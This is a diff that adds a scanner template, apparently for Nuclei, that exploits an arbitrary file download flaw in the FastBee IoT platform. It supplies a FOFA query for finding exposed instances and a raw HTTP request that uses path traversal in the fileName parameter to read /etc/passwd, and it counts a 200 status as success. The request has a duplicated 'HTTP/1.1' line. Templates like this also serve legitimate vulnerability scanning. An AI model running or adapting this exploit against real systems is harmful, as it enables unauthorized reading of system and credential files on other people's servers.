@@ -1,0 +1,25 @@
+id: poc-iuu7g54kmcvhyk72
+info:
+  name: 蜂信物联(FastBee) 物联网平台 任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iuu7g54kmcvhyk72'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iuu7g54kmcvhyk72
+    fofa: title="FastBee"
+http:
+- raw:
+  - 'GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
+
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
